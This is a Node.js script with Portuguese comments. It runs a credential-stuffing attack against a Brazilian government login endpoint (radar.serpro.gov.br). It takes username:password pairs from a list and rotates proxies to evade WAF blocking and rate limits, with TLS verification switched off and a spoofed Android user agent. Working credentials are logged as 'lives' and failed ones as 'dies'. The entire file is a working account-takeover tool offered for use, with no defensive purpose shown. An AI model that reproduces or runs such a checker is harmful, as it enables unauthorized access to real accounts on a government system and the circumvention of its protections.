const fs = require('fs');
const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');

const colors = {
    green: '\x1b[32m',
    red: '\x1b[31m',
    yellow: '\x1b[33m',
    reset: '\x1b[0m'
};

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function getProxyConfig(proxyStr) {
    if (!proxyStr) return null;
    const parts = proxyStr.trim().split(':');
    if (parts.length < 2) return null;

    const host = parts[0];
    const port = parseInt(parts[1]);
    
    if (isNaN(port) || port < 0 || port > 65535) {
        return null; // Porta inválida
    }

    const config = {
        host,
        port
    };

    if (parts.length === 4) {
        config.auth = {
            username: parts[2],
            password: parts[3]
        };
    }
    return config;
}

async function loginSerpro(username, password, proxyStr) {
    const payload = {
        imei: '',
        latitude: 0,
        longitude: 0,
        password: password,
        username: username
    };

    const headers = {
        'User-Agent': 'Dalvik/2.1.0 (Linux; Android 14)',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json'
    };

    const axiosConfig = {
        headers,
        timeout: 10000
    };

    if (proxyStr) {
        axiosConfig.proxy = getProxyConfig(proxyStr);
    }

    try {
        const httpsAgent = new (require('https').Agent)({
            rejectUnauthorized: false
        });

        axiosConfig.httpsAgent = httpsAgent;
        
        const response = await axios.post(
            'https://radar.serpro.gov.br/core-rest/gip-rest/auth/loginTalonario',
            payload,
            axiosConfig
        );

        if (response.data && response.data.token) {
            return { success: true, message: 'Token OK' };
        }
        
        if (response.data && response.data.stok) {
             return { success: false, message: `Veio STOK (Code: ${response.data.code}) mas sem Token` };
        }

        return { success: false, message: JSON.stringify(response.data) };
    } catch (err) {
        let msg = err.message;
        let isBlock = false;

        // Erros de rede/proxy que devem forçar troca de proxy
        const networkErrors = [
            'ECONNRESET', 'ETIMEDOUT', 'ECONNREFUSED', 'EPROTO', 
            'socket hang up', 'network socket disconnected'
        ];

        // Verifica se é erro de rede conhecido
        if (networkErrors.some(e => msg.includes(e)) || err.code === 'ECONNABORTED') {
            isBlock = true;
            msg = `Erro de Conexão/Proxy (${msg})`;
        } else if (err.response) {
            if (typeof err.response.data === 'string' && err.response.data.includes('Request Rejected')) {
                isBlock = true;
                msg = 'Request Rejected (WAF Block)';
            } else if (err.response.status === 403 || err.response.status === 407 || err.response.status === 502 || err.response.status === 503) {
                // As vezes 403 é credencial invalida, as vezes é WAF.
                // Mas geralmente credencial invalida retorna JSON. Se for HTML ou texto, é provavel block.
                // 502/503 geralmente é erro de gateway/proxy
                if (typeof err.response.data === 'string' || err.response.status >= 500) {
                    isBlock = true;
                }
                if (err.response.data) msg = JSON.stringify(err.response.data);
            } else if (err.response.data) {
                 msg = JSON.stringify(err.response.data);
            }
        }
        
        return { success: false, message: msg, isBlock };
    }
}

async function processarLista() {
    if (!fs.existsSync('lista.txt')) {
        console.log('Arquivo lista.txt não encontrado!');
        return;
    }

    let proxies = [];
    if (fs.existsSync('live_proxies.txt')) {
        proxies = fs.readFileSync('live_proxies.txt', 'utf-8')
            .split('\n')
            .map(l => l.trim())
            .filter(l => l && l.includes(':'));
    }

    if (proxies.length === 0) {
        console.log('Aviso: Nenhum proxy encontrado em live_proxies.txt, rodando sem proxy.');
    } else {
        console.log(`Carregados ${proxies.length} proxies.`);
    }

    const content = fs.readFileSync('lista.txt', 'utf-8');
    let linhas = content.split('\n').map(l => l.trim()).filter(l => l && l.includes(':'));

    console.log(`Iniciando verificação de ${linhas.length} logins...\n`);

    const linhasParaProcessar = [...linhas];
    let proxyIndex = 0;

    for (const linha of linhasParaProcessar) {
        const [login, senha] = linha.split(':');
        
        let tentou = false;
        let sucessoOuFalhaDefinitiva = false;

        while (!sucessoOuFalhaDefinitiva) {
            let currentProxy = proxies.length > 0 ? proxies[proxyIndex] : null;
            
            // Se tiver proxy, rotaciona para o próximo para a próxima tentativa
            if (proxies.length > 0) {
                proxyIndex = (proxyIndex + 1) % proxies.length;
            }

            const result = await loginSerpro(login, senha, currentProxy);

            if (result.isBlock) {
                console.log(`${colors.yellow}Bloqueado com proxy ${currentProxy || 'sem proxy'} - Motivo: ${result.message} - Trocando...${colors.reset}`);
                if (proxies.length === 0) {
                    // Se não tem proxy e foi bloqueado, não tem o que fazer, aborta ou espera
                    console.log('Sem proxies para rotacionar. Aguardando 10s...');
                    await sleep(10000);
                }
                continue; // Tenta de novo com proximo proxy
            }

            // Se não foi bloqueio (é live ou die normal)
            if (result.success) {
                console.log(`${colors.green}Live ${login}:${senha} - #hcoder [${result.message}]${colors.reset}`);
                fs.appendFileSync('lives.txt', `${login}:${senha}\n`);
            } else {
                console.log(`${colors.red}Die ${login}:${senha} - #hcoder [Retorno: ${result.message}]${colors.reset}`);
                fs.appendFileSync('dies.txt', `${login}:${senha}\n`);
                
                // Remove da lista original
                linhas = linhas.filter(l => l !== linha);
                fs.writeFileSync('lista.txt', linhas.join('\n'));
            }
            
            sucessoOuFalhaDefinitiva = true;
        }

        // Espera 4 segundos antes do próximo login
        await sleep(4000);
    }
}

processarLista();
